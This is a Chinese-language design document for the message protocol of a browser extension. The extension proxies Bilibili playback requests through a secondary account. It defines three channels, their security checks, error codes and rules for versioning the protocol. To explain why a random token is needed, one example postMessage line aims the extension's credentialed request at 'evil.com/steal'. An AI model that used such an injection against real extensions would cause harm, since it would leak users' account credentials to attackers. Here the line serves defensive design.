# 跨环境消息协议

> 状态：草案（v1 骨架阶段定稿）
> 代码真相源：`src/shared/types/messages.ts`
> 本文档为**解释性摘要**，字段以代码为准

---

## 为什么需要这份协议

MV3 的四个执行环境内存不共享：

| 环境 | 有 `chrome.*` | 有 DOM | 能看页面 JS 变量 |
| --- | --- | --- | --- |
| MAIN world | ❌ | ✅ | ✅ |
| ISOLATED world（content script） | ✅ | ✅ | ❌ |
| Service Worker | ✅ | ❌ | ❌ |
| Popup / Options | ✅ | ✅ | ❌ |

任何跨环境的数据传递都必须**显式定义成消息**。不许出现"我直接读一下那个变量"的写法。

---

## 三条通道

```
┌─────────────┐   channel A    ┌──────────────┐   channel B   ┌─────────────┐
│ MAIN world  │ ←postMessage→  │ ISOLATED     │ ←sendMessage→ │ Service     │
│ (net-hook)  │               │ (content)    │               │ Worker      │
└─────────────┘               └──────────────┘               └──────┬──────┘
                                                                    │
                                                             channel C
                                                                    │
                                                    ┌───────────────▼────┐
                                                    │ Popup / Options /  │
                                                    │ Login Window       │
                                                    └────────────────────┘
```

| 通道 | 机制 | 安全要点 |
| --- | --- | --- |
| A：MAIN ↔ ISOLATED | `window.postMessage` | **必须带随机 channelToken**，且 ISOLATED 侧二次校验 URL 白名单 |
| B：ISOLATED ↔ SW | `chrome.runtime.sendMessage` | 需处理 SW 休眠导致的连接失败，重试一次 |
| C：UI ↔ SW | `chrome.runtime.sendMessage` | 凭据永不下发给 UI，只下发"是否健康"之类的状态 |

---

## 通道 A：MAIN world ↔ ISOLATED world

### 为什么不能省掉 token

页面上的任意脚本都能监听 `window.message`。如果没有 token 校验，恶意脚本可以：

```js
window.postMessage({ __pluma: true, type: 'req', url: 'https://evil.com/steal' }, '*');
```

然后扩展就会**用播放账号的凭据**去请求攻击者的服务器——凭据直接泄露。

### 三层防护

1. **随机 token**：MAIN world 注入时生成 `crypto.randomUUID()`，只存在于闭包里，通过消息携带
2. **白名单复检**：ISOLATED world 收到消息后，**不信任何已校验的结论**，重新做一遍 host + pathname + method 校验
3. **方向限制**：只允许 `req`（MAIN→ISOLATED）和 `res`（ISOLATED→MAIN）两种类型，其他一律丢弃

### 消息形状

```js
// MAIN → ISOLATED
{
  __pluma: 1,            // 协议版本，不匹配直接丢弃
  token: "<uuid>",
  type: 'req',
  id: "<uuid>",          // 用于关联响应
  payload: {
    method: 'GET',
    url: 'https://api.bilibili.com/x/player/wbi/playurl?bvid=...',
    headers: { ... },
    body?: string,
  },
}

// ISOLATED → MAIN
{ __pluma: 1, type: 'res', id: "<同一个 id>", ok: true, status: 200, body: "..." }
{ __pluma: 1, type: 'res', id: "<同一个 id>", ok: false, error: 'not-in-whitelist' | 'http-403' | 'biz--412' | 'timeout' }
```

### 超时约定

MAIN world 发请求后 **8 秒**无响应即视为失败，走原始请求（回退主账号）。这个值要比 SW 侧的请求超时短，保证用户不会看到空白播放器。

---

## 通道 B：ISOLATED ↔ Service Worker

### 消息类型清单

| type | 方向 | payload | 说明 |
| --- | --- | --- | --- |
| `bridge/ping` | C→SW | — | 检查 SW 是否存活 |
| `playinfo/proxy` | C→SW | `{ method, url, headers, body }` | **核心**：请求代理（实际执行 DNR 那一步） |
| `account/status` | UI→SW | — | 查询两个账号的状态摘要 |
| `account/qr-start` | UI→SW | `{ purpose: 'playback' }` | 开始扫码会话 |
| `account/qr-poll` | UI→SW | `{ sessionId }` | 轮询扫码状态 |
| `account/remove` | UI→SW | `{ accountId }` | 删除播放账号条目 |
| `account/health` | SW→UI | `{ accounts, degraded, successRate }` | 状态推送 |
| `diagnose/quality` | UI→SW | `{ bvid, cid }` | 主/副账号画质对比 |
| `diagnose/audio-env` | UI→SW | — | 音质环境自检结果 |
| `stats/recent` | UI→SW | — | 最近成功率环形数组 |

### 统一响应包装

```ts
type Reply<T> =
  | { ok: true; data: T }
  | { ok: false; code: ErrCode; message?: string };
```

**错误码必须枚举**，不许直接返回字符串。因为 UI 要按错误码决定显示哪个状态（见 `docs/02-ui-spec.md` 的五种状态）。

```ts
enum ErrCode {
  NO_PLAYBACK_ACCOUNT = 'no-playback-account',
  CREDENTIAL_EXPIRED = 'credential-expired',
  DNR_RULE_EXHAUSTED = 'dnr-rule-exhausted',
  BIZ_ERROR = 'biz-error',        // 带 detail: -412 / -101 / -404 ...
  NETWORK = 'network',
  TIMEOUT = 'timeout',
  NOT_IN_WHITELIST = 'not-in-whitelist',
}
```

> ⚠️ **错误码是 UI 与业务的契约。** 新增一种失败原因时，先加错误码，再改 UI，再改实现。反过来做会导致 UI 出现"未知错误"这种无信息量的提示。

### SW 休眠的处理

MV3 的 SW 在 30 秒无事件后休眠。`sendMessage` 可能抛：

```
Could not establish connection. Receiving end does not exist.
```

**统一封装在 `platform/runtime/messaging.ts`**：

```ts
async function send<T>(msg: Msg): Promise<Reply<T>> {
  try {
    return await chrome.runtime.sendMessage(msg);
  } catch (e) {
    if (isSwWaking(e)) {
      await sleep(120);          // 给 SW 一点启动时间
      return await chrome.runtime.sendMessage(msg);   // 只重试一次
    }
    throw e;
  }
}
```

**只重试一次。** 重试多次会掩盖真正的 bug（比如 handler 没注册）。

---

## 通道 C：UI ↔ Service Worker

UI 有三个入口：popup、options、login window。

### 关键约束

1. **凭据永不下发给 UI。** UI 只能拿到 `{ uname, mid, vipLabel, expireAt, healthy }`，拿不到 `sessdata`。
2. **popup 失焦即销毁。** 任何"等用户操作"的长流程都不能在 popup 里跑（见 `docs/02-ui-spec.md` §1）。
3. **扫码走独立窗口。** popup 点"扫码登录"后，由 SW 或 popup 调 `chrome.windows.create({ type: 'popup' })` 开一个 420×560 的窗口。窗口关闭时通知 SW 清理扫码会话。

### 状态推送 vs 轮询

popup 存活时间很短，用**拉取**（打开时查一次）比**推送**简单可靠。

```
popup 打开 → send({ type: 'account/status' }) → 渲染对应状态
（不需要 SW 主动 push，因为 popup 生命周期太短，push 没有意义）
```

只有 options 页需要**推送**（用户可能停留很久，状态要实时更新）：SW 用 `chrome.runtime.sendMessage` 广播 `account/health`，options 页监听。

---

## 协议演进规则

1. **协议版本号 `__pluma: 1` 必须随不兼容改动递增。** 收到不匹配的版本直接丢弃消息，不做兼容转换。
2. **新增字段必须可选**，老版本收到不认识的字段应忽略而非报错。
3. **删除字段必须先标记 deprecated 一个版本**，再删。
4. **`shared/types/messages.ts` 是唯一真相源**，本文档从代码抄，不要反向维护。

---

## 相关代码位置

| 概念 | 文件 |
| --- | --- |
| 消息类型定义 | `src/shared/types/messages.ts` |
| 错误码 | `src/shared/types/errors.ts` |
| MAIN world 通道 | `src/content/main-world/channel.ts` |
| ISOLATED 侧处理 | `src/content/isolated/router.ts` |
| SW 消息分发 | `src/background/index.ts` + `handlers/*.ts` |
| UI 侧调用封装 | `src/platform/runtime/messaging.ts` |
